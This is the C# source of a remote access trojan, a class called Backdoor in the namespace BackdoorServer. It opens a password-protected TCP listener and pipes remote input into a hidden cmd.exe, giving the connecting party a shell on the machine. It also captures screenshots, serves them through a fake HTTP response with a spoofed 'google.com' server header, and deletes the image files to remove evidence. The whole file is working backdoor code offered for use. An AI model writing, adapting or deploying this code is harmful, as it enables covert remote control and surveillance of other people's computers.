using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Text;
using System.Drawing;
using System.Windows.Forms;
using RAT;

namespace BackdoorServer
{
    public class Backdoor
    {
        TcpListener listener;
        Socket socket;
        Process shell;
        StreamReader fromShell;
        StreamWriter toShell;
        StreamReader inStream;
        StreamWriter outStream;
        Thread shellReaderThread;

        int port { get; set; }
        string serverName { get; set; }
        string password { get; }
        bool verbose { get; set; }

        public Backdoor(int port = 1337, string serverName = "RAT", string password = "P455wD", bool verbose = true)
        {
            this.port = port;
            this.serverName = serverName;
            this.password = password;
            this.verbose = verbose;
        }

        public void startServer()
        {
            try
            {
                if (verbose) Console.WriteLine("Listening on port " + port);

                listener = new TcpListener(IPAddress.Any, port);
                listener.Start(); // blocking call
                socket = listener.AcceptSocket();

                if (verbose) Console.WriteLine("Client connected: " + socket.RemoteEndPoint);

                Stream s = new NetworkStream(socket);
                inStream = new StreamReader(s, Encoding.ASCII);
                outStream = new StreamWriter(s, Encoding.ASCII);
                outStream.AutoFlush = true;

                outStream.WriteLine("Pswd:");
                string checkPass = inStream.ReadLine();

                if (verbose) Console.WriteLine("Client tried password " + checkPass);
                if (!checkPass.Equals(password))
                {
                    if (verbose) Console.WriteLine("Incorrect Password");
                    DropConnection();
                    return;
                }
                if (verbose) Console.WriteLine("Password Accepted.");

                StartShell();
            }
            catch (Exception e)
            {
                Console.WriteLine("<ERROR> Bad things happen:");
                Console.WriteLine(e.ToString());
            }
            finally
            {
                CloseShell();
            }
        }
        void StartShell()
        {
            shell = new Process();
            ProcessStartInfo p = new ProcessStartInfo("cmd")
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardError = true,
                RedirectStandardInput = true,
                RedirectStandardOutput = true
            };
            shell.StartInfo = p;
            shell.Start();

            toShell = shell.StandardInput;
            fromShell = shell.StandardOutput;
            toShell.AutoFlush = true;

            // start sending output to the user
            shellReaderThread = new Thread(new ThreadStart(SendShellOutput));
            shellReaderThread.Start();

            // welcome message
            outStream.WriteLine("  Welcome to " + serverName + " RAT  ".AlignCenter(80, '='));
            outStream.WriteLine("  SINGLE-USER MODE  ".AlignCenter(80, '='));

            InputLoop();
        }

        void SendShellOutput()
        {
            string buffer = "";
            while ((buffer = fromShell.ReadLine()) != null)
            {
                outStream.WriteLine(buffer + "\r");

                // temporary, for logging
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine(buffer);
                Console.ResetColor();
            }
            CloseShell();
        }

        void InputLoop()
        {
            string tempBuff = "";
            while (((tempBuff = inStream.ReadLine()) != null))
            {
                if (verbose) Console.WriteLine(">> " + tempBuff);
                HandleCommand(tempBuff);
            }
        }

        void HandleCommand(string command)
        {
            switch (command)
            {
                case RatAction.SCREENSHOT:
                    if (verbose) outStream.WriteLine("Taking a screenshot...");
                    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "ppppp.png");
                    WindowsHelper.MakeScreenshot(path);

                    Console.WriteLine("Image is hosted at port 2790");
                    outStream.WriteLine("Image is hosted at port 2790");
                    HostImage(path);
                    Console.WriteLine("Image Sent < OK > !");
                    // delete all proofs
                    File.Delete(path);
                    Console.WriteLine("Image deleted");
                    if (verbose) outStream.WriteLine("Screenshot downloaded and deleted successfully!");
                    break;
                case RatAction.QUIT:
                    outStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
                    CloseShell();
                    break;
                default:
                    toShell.WriteLine(command + "\r\n");
                    break;
            }
        }

        void HostImage(string path)
        {
            string responseHeaders =
                "HTTP/1.1 200 OK\r\n" +
                    "Server: google.com\r\n" +
                    "Content-Length: " + new FileInfo(path).Length + "\r\n" +
                    "Content-Type: image/png\r\n" +
                    "Content-Disposition: inline;filename=\"image.png;\"\r\n" +
                    "\r\n";

            //headers should ALWAYS be ascii. Never UTF8
            var headerBytes = Encoding.ASCII.GetBytes(responseHeaders);

            var lstr = new TcpListener(IPAddress.Any, RatAction.SCREENSHOT_PORT);
            lstr.Start();
            Console.WriteLine("Waiting for client to connect...");
            var webSocket = lstr.AcceptSocket();

            webSocket.Send(headerBytes);
            webSocket.SendFile(path);
            webSocket.Close();
            lstr.Stop();
        }


        void DropConnection()
        {
            if (verbose) Console.WriteLine("Dropping Connection");
            inStream.Dispose();
            outStream.Dispose();
            socket.Close();
            listener.Stop();
        }

        void CloseShell()
        {
            try
            {
                if (verbose) Console.WriteLine("Closing shell process");
                if (shell != null)
                {
                    shell.Close();
                    shell.Dispose();
                }
                if (shellReaderThread != null)
                {
                    shellReaderThread.Abort();
                    shellReaderThread = null;
                }
                toShell.Dispose();
                fromShell.Dispose();
                shell.Dispose();

                DropConnection();
            }
            catch (Exception) { }
        }

        static void Main(string[] args)
        {
            try
            {
                Backdoor bd = new Backdoor();
                if (args.Length == 1)
                    bd = new Backdoor(int.Parse(args[0]));
                if (args.Length == 2)
                    bd = new Backdoor(int.Parse(args[0]), args[1]);
                if (args.Length == 3)
                    bd = new Backdoor(int.Parse(args[0]), args[1], args[2]);
                else if (args.Length == 4)
                    bd = new Backdoor(int.Parse(args[0]), args[1], args[2], bool.Parse(args[3]));
                while (true)
                {
                    bd.startServer();
                }
            }
            catch (Exception) { }
        }
    }
}
